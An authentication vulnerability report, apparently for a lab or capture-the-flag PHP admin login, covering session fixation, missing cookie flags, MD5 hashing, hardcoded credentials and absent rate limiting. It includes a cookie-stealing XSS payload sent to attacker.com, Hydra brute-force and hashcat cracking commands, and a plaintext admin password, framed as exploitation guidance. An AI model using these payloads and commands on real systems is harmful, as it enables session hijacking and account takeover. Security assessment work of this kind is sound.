# Authentication Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Critical authentication vulnerabilities were identified across all areas of the authentication system. The application has NO effective authentication security controls, making it trivially exploitable via multiple attack vectors.
- **Purpose of this Document:** This report provides comprehensive analysis of the application's authentication mechanisms, identifying systematic failures in transport security, session management, password policies, and account lifecycle management. These findings enable effective exploitation of authentication bypass and session hijacking vulnerabilities.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Complete Absence of Transport Security

- **Description:** The application runs exclusively on HTTP without any TLS/HTTPS configuration. No encryption protects authentication credentials or session cookies in transit. HSTS is not configured, and no cache control headers prevent sensitive authentication responses from being cached.
- **Implication:** All authentication traffic is transmitted in plaintext, enabling trivial man-in-the-middle attacks, credential interception, and session hijacking via network sniffing.
- **Representative Findings:** `AUTH-VULN-01` (HTTP-only transport), `AUTH-VULN-02` (missing cache control headers)
- **Affected Components:**
  - Apache VirtualHost configuration (`/app/000-default.conf:1`) - only port 80 configured
  - Docker Compose (`docker-compose.yml:8`) - only HTTP port exposed
  - Authentication endpoint (`/app/html/admin.php`) - no security headers

### Pattern 2: Fundamentally Broken Session Management

- **Description:** Session cookies lack all security flags (HttpOnly, Secure, SameSite), session IDs are not regenerated after authentication, and no logout mechanism exists. Sessions are logged in Apache access logs and have no absolute timeout enforcement.
- **Implication:** Attackers can trivially hijack sessions through XSS-based cookie theft, session fixation attacks, network interception, and CSRF. Users cannot terminate sessions even when aware of compromise.
- **Representative Findings:** `AUTH-VULN-03` (session fixation), `AUTH-VULN-04` (missing cookie security flags), `AUTH-VULN-05` (no logout mechanism), `AUTH-VULN-06` (sessions logged in access logs)
- **Affected Components:**
  - Session initialization (`/app/html/admin.php:2`) - no cookie security configuration
  - Login success handler (`/app/html/admin.php:25`) - no session regeneration
  - Apache logging (`/app/000-default.conf:16`) - logs session cookies
  - Application architecture - no logout endpoint exists

### Pattern 3: Cryptographically Broken Password Storage

- **Description:** Passwords are hashed using MD5 without salt. MD5 has been cryptographically broken since 2004 and can be reversed using rainbow tables or brute-forced at billions of hashes per second on modern GPUs.
- **Implication:** If an attacker gains database access (via SQL injection or other means), admin credentials can be cracked instantly. The hardcoded default password in source code is also vulnerable to discovery.
- **Representative Findings:** `AUTH-VULN-07` (MD5 password hashing), `AUTH-VULN-08` (hardcoded default credentials)
- **Affected Components:**
  - Password processing (`/app/html/admin.php:18`) - MD5 hashing
  - Database initialization (`/app/db_init.sql:57`) - hardcoded password visible in source

### Pattern 4: Zero Abuse Prevention Controls

- **Description:** No rate limiting, CAPTCHA, account lockout, or monitoring exists for authentication attempts. Unlimited login attempts can be made at maximum speed without any defensive response.
- **Implication:** Attackers can execute unlimited brute force attacks, credential stuffing, and password spraying with zero resistance or detection.
- **Representative Findings:** `AUTH-VULN-09` (no rate limiting), `AUTH-VULN-10` (no account lockout)
- **Affected Components:**
  - Authentication endpoint (`/app/html/admin.php:11-31`) - no rate limiting logic
  - Apache configuration (`/app/000-default.conf`) - no mod_ratelimit or protective modules
  - Database schema (`/app/db_init.sql:27-31`) - no failed attempt tracking columns

### Pattern 5: Incomplete Authentication Lifecycle

- **Description:** No password recovery mechanism exists, no logout functionality is implemented, and no password change capability is available. Users cannot recover from forgotten passwords or terminate sessions.
- **Implication:** Sessions persist indefinitely with no user control, creating risks on shared computers. Compromised passwords cannot be changed. Forgotten passwords require database-level intervention.
- **Representative Findings:** `AUTH-VULN-05` (no logout), `AUTH-VULN-11` (no password recovery)
- **Affected Components:**
  - Missing logout endpoint (`/app/html/logout.php` does not exist)
  - Missing password reset functionality (no reset.php, forgot.php)
  - Database schema lacks password recovery columns

## 3. Strategic Intelligence for Exploitation

### Authentication Architecture

**Authentication Method:** Session-based authentication using PHP native sessions (PHPSESSID cookie)

**Session Storage:** File-based sessions in `/tmp/sess_[SESSION_ID]` within the web container

**Authentication Flow:**
1. User submits credentials to `POST /admin.php`
2. Application queries database: `SELECT id FROM admins WHERE username = '$username' AND password = '$password'`
3. On successful match (1 row returned), sets `$_SESSION['admin_logged_in'] = true`
4. Subsequent requests check session variable to grant access
5. No session regeneration occurs (session fixation vulnerability)

**Critical Weaknesses in Authentication Flow:**
- SQL injection in authentication query (`/app/html/admin.php:20`) allows complete bypass
- MD5 password hashing enables offline cracking if database is compromised
- No session regeneration after login enables session fixation attacks
- No rate limiting allows unlimited authentication attempts

### Session Token Details

**Cookie Name:** `PHPSESSID`

**Cookie Format:** 32-character hexadecimal string (e.g., `3c6a3bf9d999698009f622b55b0f8ed2`)

**Cookie Attributes (Current - INSECURE):**
- `Set-Cookie: PHPSESSID=<32_hex_chars>; path=/`
- **Missing HttpOnly:** Cookie accessible to JavaScript - enables XSS-based theft
- **Missing Secure:** Cookie transmitted over HTTP - enables network interception
- **Missing SameSite:** Cookie sent with cross-site requests - enables CSRF
- **Lifetime:** 0 (session cookie - expires on browser close, but unreliable)

**Session Data Storage:**
- Location: `/tmp/sess_<PHPSESSID>` in web container
- Format: PHP serialized data - `admin_logged_in|b:1;`
- Encryption: None - stored as plaintext
- Persistence: Until browser closes or garbage collection runs (1440 seconds idle timeout)

**Session ID Generation:** PHP 7.4 default CSPRNG - 128 bits of entropy (cryptographically secure, but mitigated by other vulnerabilities)

**Critical Session Vulnerabilities:**
- Sessions logged in Apache access logs (`/var/log/apache2/access2.log`) with full cookie header
- No session regeneration after authentication - vulnerable to session fixation
- No absolute session timeout - sessions valid indefinitely if user remains active
- No logout mechanism - sessions cannot be actively terminated
- Garbage collection probabilistic (1% per request) - sessions may persist beyond 24 minutes

### Password Policy

**Current Policy:** NONE - No password strength requirements, no complexity validation, no length restrictions

**Password Storage:** MD5 hash without salt (`/app/html/admin.php:18`)

**Default Credentials (Hardcoded):**
- Username: `admin`
- Password: `ONEverySecurePassword123!`
- MD5 Hash: `5700901decb6098817def1a9fe59957b`
- Location: `/app/db_init.sql:57`

**Password Recovery:** NOT IMPLEMENTED - No reset mechanism exists

**Password Change:** NOT IMPLEMENTED - No change mechanism exists

**Multi-Factor Authentication:** NOT IMPLEMENTED - Single-factor authentication only

**Exploitation Guidance:**
- Default password is visible in source code - try first
- MD5 hash can be cracked using hashcat, john, or online rainbow tables
- No account lockout - unlimited password guessing attempts
- No password expiration - credentials never require rotation

### Transport Security

**Protocol:** HTTP only - no HTTPS/TLS configuration

**Port Configuration:**
- HTTP: Port 80 (exposed via Docker on port 39001 externally)
- HTTPS: Not configured

**HSTS:** Not enabled - no `Strict-Transport-Security` header

**Cache Control:** Not configured for authentication responses

**Exploitation Impact:**
- All credentials transmitted in plaintext - trivially intercepted via network sniffing
- Session cookies transmitted over HTTP - hijackable via MITM attacks
- No protection against SSL stripping (no HSTS)
- Authentication responses may be cached by browsers

### Rate Limiting & Abuse Controls

**Rate Limiting:** NONE at any layer (Apache, PHP application, infrastructure)

**CAPTCHA:** NOT IMPLEMENTED

**Account Lockout:** NOT IMPLEMENTED - No failed attempt tracking

**Monitoring/Alerting:** NOT IMPLEMENTED - No security event logging beyond basic Apache access logs

**Exploitation Guidance:**
- Unlimited authentication attempts at maximum speed
- No delays between attempts
- No IP-based or account-based restrictions
- Tools like Hydra, Burp Intruder, or custom scripts can run unthrottled
- Example: `hydra -l admin -P passwords.txt http-post-form "admin.php:username=^USER^&password=^PASS^:Invalid username or password"`

### Authentication Error Messages

**Error Message on Failed Login:** "Invalid username or password." (Generic - prevents username enumeration)

**Database Connection Errors:** Exposed with full technical details (`/app/html/admin.php:14`)

**Exploitation Note:** While generic error messages prevent username enumeration, the SQL injection vulnerability (`/app/html/admin.php:20`) completely bypasses authentication, rendering error message security irrelevant.

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Session ID Generation | `/app/html/admin.php:2` (PHP 7.4 default) | PHP 7.4 uses cryptographically secure PRNG with 128 bits entropy | SAFE |
| Session ID URL Leakage | All endpoints | Session IDs transmitted via cookies only, not in URLs (PHP default `session.use_only_cookies = 1`) | SAFE |
| Generic Error Messages | `/app/html/admin.php:28` | Single generic message "Invalid username or password" prevents user enumeration | SAFE |
| No Open Redirects | All endpoints | No redirect functionality exists - no user-controlled redirect parameters | SAFE |

**Note:** While these specific controls are implemented correctly, they provide minimal protection given the presence of critical vulnerabilities like SQL injection that bypass authentication entirely.

## 5. Critical Findings Detail

### Finding 1: HTTP-Only Transport (No HTTPS/TLS)

**Severity:** CRITICAL  
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
**CVSS:** 7.4 (High)

**Location:** `/app/000-default.conf:1`, `docker-compose.yml:8`

**Description:** The application is configured to serve traffic exclusively over HTTP (port 80) with no HTTPS/TLS configuration. Apache VirtualHost listens only on port 80, and Docker exposes only HTTP port. No SSL certificates, no port 443 configuration, and no HTTP-to-HTTPS redirects exist.

**Evidence:**
- Apache VirtualHost: `<VirtualHost *:80>` - no HTTPS virtual host
- Docker Compose: `ports: - 80` - only HTTP exposed
- No SSL certificate files in application
- HSTS header not configured

**Impact:**
- All authentication credentials transmitted in plaintext
- Session cookies transmitted in cleartext
- Man-in-the-middle attacks can capture credentials and session tokens
- Network sniffing reveals admin password and session IDs
- No protection against protocol downgrade attacks

### Finding 2: Missing Cache Control Headers on Authentication Responses

**Severity:** MEDIUM  
**CWE:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information)  
**CVSS:** 5.3 (Medium)

**Location:** `/app/html/admin.php` (no cache headers configured)

**Description:** Authentication responses lack cache control headers. Browsers may cache sensitive authentication responses including session establishment and flag disclosure.

**Evidence:**
- No `Cache-Control: no-store, no-cache, must-revalidate` header
- No `Pragma: no-cache` header  
- No `Expires: 0` header
- Apache configuration lacks cache control directives for sensitive paths

**Impact:**
- Authenticated content may be cached in browser cache
- Shared computers may expose cached authentication responses
- Browser cache may retain sensitive data after session ends

### Finding 3: Session Fixation Vulnerability

**Severity:** CRITICAL  
**CWE:** CWE-384 (Session Fixation)  
**CVSS:** 8.1 (High)

**Location:** `/app/html/admin.php:25` (missing `session_regenerate_id()`)

**Description:** After successful authentication, the application does not regenerate the session ID. The same session ID used for anonymous access continues to be used for authenticated access. This enables session fixation attacks where an attacker sets a victim's session ID before authentication and hijacks it after the victim logs in.

**Vulnerable Code:**
```php
if ($result->num_rows == 1) {
    // Set session variable
    $_SESSION['admin_logged_in'] = true;  // ← No session regeneration!
    echo "@FLAG@";
}
```

**Required Fix:**
```php
if ($result->num_rows == 1) {
    session_regenerate_id(true);  // ← MISSING
    $_SESSION['admin_logged_in'] = true;
    echo "@FLAG@";
}
```

**Attack Scenario:**
1. Attacker visits `/admin.php` and obtains session ID: `PHPSESSID=attacker_session_id`
2. Attacker tricks victim into using this session (via XSS, social engineering, or cookie injection)
3. Victim logs in successfully with attacker's pre-set session ID
4. Attacker uses the same session ID to access admin panel
5. Both victim and attacker share authenticated session

**Exploitation:** `curl -c cookies.txt http://localhost:39001/admin.php` → save session ID → victim authenticates with this ID → attacker reuses saved session

### Finding 4: Missing Session Cookie Security Flags

**Severity:** CRITICAL  
**CWE:** CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag), CWE-614 (Sensitive Cookie Without 'Secure' Attribute)  
**CVSS:** 8.1 (High)

**Location:** `/app/html/admin.php:2` (session_start without cookie configuration)

**Description:** Session cookies lack all three critical security flags: HttpOnly, Secure, and SameSite. This exposes session cookies to JavaScript access (XSS theft), network interception (MITM attacks), and cross-site request forgery.

**Current Cookie Header:**
```
Set-Cookie: PHPSESSID=3c6a3bf9d999698009f622b55b0f8ed2; path=/
```

**Missing Flags:**
- **HttpOnly:** NOT SET - JavaScript can access cookie via `document.cookie`
- **Secure:** NOT SET - Cookie transmitted over HTTP
- **SameSite:** NOT SET - Cookie sent with cross-site requests

**Impact:**

1. **Missing HttpOnly enables XSS-based session theft:**
   - Stored XSS payload: `<script>fetch('http://attacker.com/?c='+document.cookie)</script>`
   - Session cookie exfiltrated to attacker
   - Attacker uses stolen cookie to impersonate victim

2. **Missing Secure enables network-based session hijacking:**
   - All traffic over HTTP (no HTTPS configured)
   - Network sniffer captures PHPSESSID cookie
   - Attacker replays cookie to access admin panel

3. **Missing SameSite enables CSRF attacks:**
   - Attacker creates malicious site that submits requests to admin.php
   - Victim's browser includes session cookie with cross-site requests
   - Attacker performs authenticated actions as victim

### Finding 5: No Logout Mechanism

**Severity:** HIGH  
**CWE:** CWE-613 (Insufficient Session Expiration)  
**CVSS:** 7.1 (High)

**Location:** Missing `/app/html/logout.php` (file does not exist)

**Description:** The application has no logout functionality. No logout endpoint exists, no `session_destroy()` calls appear in the codebase, and no mechanism allows users to actively terminate their sessions. Sessions persist until browser closes (unreliable) or PHP garbage collection runs (probabilistic, up to 24 minutes).

**Evidence:**
- No logout.php file exists
- No `session_destroy()` function called anywhere
- No `session_unset()` function called anywhere
- No logout links in user interface
- Users have no way to terminate authenticated sessions

**Impact:**
- Sessions persist on shared computers after user leaves
- Stolen sessions cannot be revoked by legitimate user
- No protection after user believes they've "logged out"
- Public computer risk - next user inherits authenticated session

**Attack Scenario (Public Computer):**
1. User logs in on library computer at T+0:00
2. User closes browser tab at T+0:05 (session still valid)
3. Attacker opens browser on same computer at T+0:10
4. Attacker navigates to admin.php
5. Session cookie still present - attacker gains admin access

### Finding 6: Session IDs Logged in Apache Access Logs

**Severity:** HIGH  
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)  
**CVSS:** 6.5 (Medium)

**Location:** `/app/000-default.conf:16`

**Description:** Apache is configured to use "combined" log format which logs all request headers including Cookie headers. This causes session IDs (PHPSESSID values) to be written in plaintext to `/var/log/apache2/access2.log`.

**Evidence:**
```apache
CustomLog /var/log/apache2/access2.log combined
```

**Example Log Entry:**
```
192.168.1.100 - - [30/Oct/2025:12:34:56 +0000] "POST /admin.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0" "PHPSESSID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
```

**Impact:**
- Session IDs exposed to anyone with log file access
- Log aggregation systems receive sensitive session tokens
- Backup systems may retain session IDs indefinitely
- Attackers with log access can hijack active sessions

### Finding 7: MD5 Password Hashing (Cryptographically Broken)

**Severity:** CRITICAL  
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)  
**CVSS:** 9.8 (Critical)

**Location:** `/app/html/admin.php:18`, `/app/db_init.sql:57`

**Description:** Passwords are hashed using MD5 without salt. MD5 has been cryptographically broken since 2004. Modern GPUs can compute billions of MD5 hashes per second, making brute force trivial. Rainbow tables for unsalted MD5 hashes are widely available online.

**Vulnerable Code:**
```php
$password = MD5($_POST['password']); // Line 18
```

**Database Storage:**
```sql
INSERT INTO admins (username, password) VALUES ('admin', MD5('ONEverySecurePassword123!')); -- Line 57
```

**Hash Value:** `5700901decb6098817def1a9fe59957b`

**Impact:**
- Admin password can be cracked in seconds using hashcat or rainbow tables
- If database is compromised (e.g., via SQL injection), credentials instantly crackable
- No salt means precomputed hash tables (rainbow tables) are effective
- MD5 computation speed: billions of hashes/second on modern GPUs

**Exploitation:**
```bash
# Crack MD5 hash using hashcat
echo "5700901decb6098817def1a9fe59957b" > hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt
# Result: ONEverySecurePassword123! (cracked in seconds)
```

### Finding 8: Hardcoded Default Credentials in Source Code

**Severity:** CRITICAL  
**CWE:** CWE-798 (Use of Hard-coded Credentials)  
**CVSS:** 9.8 (Critical)

**Location:** `/app/db_init.sql:57`

**Description:** The admin password is hardcoded in plaintext in the database initialization script. Anyone with access to the source code repository can see the default admin password.

**Evidence:**
```sql
INSERT INTO admins (username, password) VALUES ('admin', MD5('ONEverySecurePassword123!'));
```

**Exposed Credentials:**
- Username: `admin`
- Password: `ONEverySecurePassword123!`
- Visibility: Visible in source code, Git history, container image layers

**Impact:**
- Default credentials are publicly accessible in source code
- No mechanism to force password change on first login
- Anyone with repository access can authenticate as admin
- Password cannot be changed (no password change functionality exists)

### Finding 9: No Rate Limiting on Authentication Endpoint

**Severity:** HIGH  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**CVSS:** 7.5 (High)

**Location:** `/app/html/admin.php:11-31` (no rate limiting logic)

**Description:** The authentication endpoint has no rate limiting at any layer (Apache, PHP application, infrastructure). Attackers can make unlimited authentication attempts at maximum speed without any throttling, delays, or defensive responses.

**Evidence:**
- No Apache mod_ratelimit or mod_evasive configured
- No PHP rate limiting logic in authentication handler
- No per-IP or per-account attempt tracking
- No progressive delays or backoff mechanisms
- Database schema lacks failed attempt tracking columns

**Impact:**
- Unlimited brute force attacks possible
- Credential stuffing attacks unthrottled
- Password spraying at maximum speed
- Automated tools can run without restriction

**Exploitation Example:**
```bash
hydra -l admin -P passwords.txt http-post-form \
  "admin.php:username=^USER^&password=^PASS^:Invalid username or password"
# Runs at maximum speed with no throttling
```

### Finding 10: No Account Lockout Mechanism

**Severity:** HIGH  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**CVSS:** 7.5 (High)

**Location:** `/app/db_init.sql:27-31` (missing lockout columns), `/app/html/admin.php` (no lockout logic)

**Description:** No account lockout mechanism exists. After unlimited failed authentication attempts, accounts remain fully accessible. No temporary suspension, no backoff delays, no CAPTCHA challenges.

**Missing Database Columns:**
```sql
-- MISSING FROM admins TABLE
failed_login_attempts INT DEFAULT 0
lockout_until DATETIME DEFAULT NULL
last_failed_login TIMESTAMP DEFAULT NULL
```

**Missing Application Logic:**
- No failed attempt counter
- No lockout duration enforcement
- No unlock mechanism
- No progressive delays after failures

**Impact:**
- Brute force attacks never trigger lockout
- Accounts remain accessible after thousands of failed attempts
- No consequences for repeated authentication failures

### Finding 11: No Password Recovery Mechanism

**Severity:** MEDIUM  
**CWE:** CWE-640 (Weak Password Recovery Mechanism for Forgotten Password)  
**CVSS:** 5.3 (Medium)

**Location:** Missing `/app/html/reset.php`, `/app/html/forgot.php` (files do not exist)

**Description:** No password recovery or reset functionality exists. Users who forget passwords have no self-service recovery option. The database lacks password reset token columns. Compromised passwords cannot be changed.

**Missing Components:**
- No password reset request form
- No reset token generation or validation
- No email delivery of reset links
- No password change interface
- No database columns for reset tokens or expiration

**Impact:**
- Users locked out if password is forgotten
- Compromised passwords cannot be changed
- No proactive password rotation capability
- Requires database-level intervention for password resets

## 6. Vulnerability Summary Table

| ID | Vulnerability Type | Severity | Externally Exploitable | Location | Confidence |
|----|-------------------|----------|----------------------|----------|------------|
| AUTH-VULN-01 | Transport_Exposure | CRITICAL | Yes | `/app/000-default.conf:1` | High |
| AUTH-VULN-02 | Transport_Exposure | MEDIUM | Yes | `/app/html/admin.php` (headers) | High |
| AUTH-VULN-03 | Session_Management_Flaw | CRITICAL | Yes | `/app/html/admin.php:25` | High |
| AUTH-VULN-04 | Session_Management_Flaw | CRITICAL | Yes | `/app/html/admin.php:2` | High |
| AUTH-VULN-05 | Session_Management_Flaw | HIGH | Yes | Missing logout.php | High |
| AUTH-VULN-06 | Session_Management_Flaw | HIGH | Yes | `/app/000-default.conf:16` | High |
| AUTH-VULN-07 | Weak_Credentials | CRITICAL | Yes | `/app/html/admin.php:18` | High |
| AUTH-VULN-08 | Weak_Credentials | CRITICAL | Yes | `/app/db_init.sql:57` | High |
| AUTH-VULN-09 | Abuse_Defenses_Missing | HIGH | Yes | `/app/html/admin.php` | High |
| AUTH-VULN-10 | Abuse_Defenses_Missing | HIGH | Yes | `/app/html/admin.php` | High |
| AUTH-VULN-11 | Reset_Recovery_Flaw | MEDIUM | Yes | Missing reset functionality | High |

## 7. Conclusion

This authentication analysis has identified **11 critical and high-severity vulnerabilities** across all areas of authentication security. The application has **zero effective security controls** for authentication and session management:

**Critical Failures:**
- No transport encryption (HTTP only)
- No session security (missing all cookie flags, no regeneration, sessions logged)
- Cryptographically broken password storage (MD5)
- Hardcoded credentials in source code
- No abuse prevention (rate limiting, lockout, CAPTCHA)
- Incomplete lifecycle (no logout, no password recovery)

**Attack Surface:** The authentication system is completely unprotected against:
- Man-in-the-middle attacks (no HTTPS)
- Session fixation (no session regeneration)
- Session hijacking (no cookie security flags, sessions logged)
- Brute force attacks (no rate limiting or lockout)
- Credential cracking (MD5 without salt)
- Persistent compromise (no logout or password change)

**Exploitation Priority:** All vulnerabilities are externally exploitable via http://localhost:39001 without internal network access. Session fixation, session hijacking, and brute force attacks are the most practical exploitation paths given the complete absence of defensive controls.
